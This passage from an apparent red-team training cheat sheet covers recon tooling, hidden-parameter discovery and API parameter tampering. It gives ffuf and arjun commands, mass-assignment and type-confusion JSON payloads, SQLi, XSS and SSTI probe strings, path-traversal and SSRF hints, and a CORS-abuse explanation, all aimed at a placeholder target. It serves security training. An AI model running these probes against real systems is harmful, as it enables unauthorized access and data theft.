subfinder -d target.com | \
nuclei -t takeovers/ -o takeovers.txt
```

### Tool Priority

| Level | Tools |
|---|---|
| Beginner | Burp Suite, Nmap, SQLMap, Nikto, FFUF |
| Intermediate | Nuclei, Subfinder/Amass, JWT Tool, Dalfox, Httpx |
| Advanced | Metasploit, SSRFmap, Katana, Kiterunner, Custom scripts |

### Full Toolkit Summary

| Phase | Tool |
|---|---|
| Subdomain recon | Subfinder, Amass |
| Live host check | Httpx |
| Port scanning | Nmap, Masscan |
| Dir bruteforce | FFUF, Feroxbuster |
| Crawling | Katana, Waybackurls |
| Vuln scanning | Nuclei, Nikto |
| Interception | Burp Suite |
| SQLi | SQLMap |
| XSS | Dalfox, XSStrike |
| API testing | Postman, Kiterunner |
| Auth attacks | JWT Tool, Hydra |
| SSRF | SSRFmap, Interactsh |
| CORS | Corsy, CORScanner |
| Reporting | Pwndoc, Ghostwriter |

---

## 14. Parameters in API Enumeration

### Types of Parameters

**URL / Query Parameters:**

```bash
GET /api/users?id=1
GET /api/search?q=test&page=1&limit=10
```

**Body Parameters:**

```json
{
  "username": "test",
  "password": "pass",
  "remember_me": true
}
```

**Header Parameters:**

```
X-User-ID: 123
X-API-Key: abc123
X-Role: admin
X-Debug: true
```

**Path Parameters:**

```
GET /api/users/{id}
GET /api/orders/{order_id}/items/{item_id}
```

**Cookie Parameters:**

```
Cookie: session=abc123
Cookie: role=user
Cookie: isAdmin=false    ← try changing to true
```

### How to Find Hidden Parameters

**Param Miner (Burp Extension):**

```
Right click request → Extensions → Param Miner → Guess params
Tests thousands of parameter names
Reports ones that change the response
```

**ARJUN:**

```bash
arjun -u https://target.com/api/users
arjun -u https://target.com/api/users -m JSON
arjun -u https://target.com/api/users -w params-wordlist.txt
# Output: [+] Found parameters: debug, admin, export, verbose
```

**FFUF Parameter Fuzzing:**

```bash
# Fuzz GET parameters
ffuf -w params.txt \
     -u "https://target.com/api/users?FUZZ=test" \
     -mc 200 -fw 10

# Fuzz POST body
ffuf -w params.txt \
     -u https://target.com/api/users \
     -X POST \
     -d 'FUZZ=test' \
     -mc 200
```

**Extract From JS Files:**

```bash
katana -u https://target.com -jc | grep "\.js"
grep -oE '[a-zA-Z_]+\s*[:=]\s*' app.js | sort -u
python3 linkfinder.py -i https://target.com/app.js -o cli
```

### What Parameters to Look For

**Debug & Internal:**

```
?debug=true          → verbose errors, stack traces
?test=true           → bypass validation
?internal=true       → access internal endpoints
?admin=true          → admin mode
?dev=true            → developer mode
?bypass=true         → bypass checks
?trace=true          → execution trace
```

**Data Control:**

```
?limit=1000          → get more records than allowed
?format=json/xml/csv → change response format
?fields=*            → get all fields
?include=password    → include sensitive fields
?expand=user,payment → expand related objects
?full=true           → full data instead of summary
```

**Access Control:**

```
?user_id=1           → access as user 1 (admin)
?role=admin          → elevate role
?impersonate=1       → impersonate another user
?sudo=true           → superuser mode
```

### Parameter Manipulation Attacks

**Parameter Tampering:**

```bash
GET /api/orders?user_id=500&status=pending
→ change to:
GET /api/orders?user_id=1&status=pending   ← get admin orders
```

**Mass Assignment:**

```json
POST /api/register
{
  "username": "hacker",
  "password": "pass123",
  "role": "admin",
  "isAdmin": true,
  "verified": true,
  "credits": 99999
}
```

**Type Confusion:**

```json
POST /api/login
{
  "username": ["admin"],   ← array instead of string
  "password": "anything"
}
```

**Negative & Boundary Values:**

```json
{ "quantity": -1 }    ← negative quantity → store owes you money
{ "price": 0 }        ← free item
{ "role": null }      ← null role = highest permission?
```

**Wildcard & Special Characters:**

```bash
GET /api/users/*         ← all users
GET /api/search?q='     ← SQLi test
GET /api/search?q=<     ← XSS test
GET /api/search?q={{7*7}} ← SSTI test
```

### Key Parameters That Always Pay Off

| Parameter | What it does | Impact |
|---|---|---|
| debug=true | verbose errors | Info disclosure |
| admin=true | admin mode | Privilege escalation |
| user_id=1 | access as admin | IDOR |
| role=admin | change your role | Privilege escalation |
| export=true | bulk data export | Data theft |
| include=* | return all fields | Sensitive data leak |
| limit=99999 | bypass pagination | Data enumeration |
| format=xml | change response format | XXE possible |
| callback=func | JSONP endpoint | XSS possible |
| redirect=url | open redirect | Phishing/token theft |
| file=../etc | path traversal | File read |
| url=http:// | SSRF trigger | Internal access |

### Automation Workflow

```bash
# Step 1 — Collect all endpoints
katana -u https://target.com -jc | tee endpoints.txt
waybackurls target.com | tee -a endpoints.txt

# Step 2 — Extract existing parameters
cat endpoints.txt | grep "?" | sed 's/=.*/=/g' | sort -u > known-params.txt

# Step 3 — Find hidden parameters
arjun -u https://target.com/api/users --stable -o hidden-params.json

# Step 4 — Fuzz parameter values
ffuf -w interesting-values.txt \
     -u "https://target.com/api/users?debug=FUZZ" \
     -mc 200 -fw 10
```

---

## Key Mindsets for Red Teaming

### Why Browser is Needed for CORS Attacks

curl can access the API but only with the attacker's own session. The browser attack uses the **victim's session** automatically via cookies:

```
Attacker's curl → gets attacker's own data (useless)
Browser CORS attack → victim's browser makes request WITH VICTIM'S COOKIES
                   → attacker gets victim's data (account takeover)
```

### Preflight Does Not Save Misconfigured CORS

```
Preflight alone = nothing
CORS policy alone = everything

Misconfigured CORS = preflight is just
an extra HTTP request before the attack works
```

### API Enumeration Mindset

```
Enumeration gives you the MAP
        ↓
Testing auth gives you OPEN DOORS
        ↓
IDOR gives you OTHER PEOPLES ROOMS
        ↓
Mass assignment gives you MASTER KEY
        ↓
Chaining gives you FULL CONTROL
```

The difference between finding one bug and owning the application is **chaining** — always ask "what can I do WITH this finding to get to the next level?"

---

*Document compiled from red team training session — for authorized security testing only.*
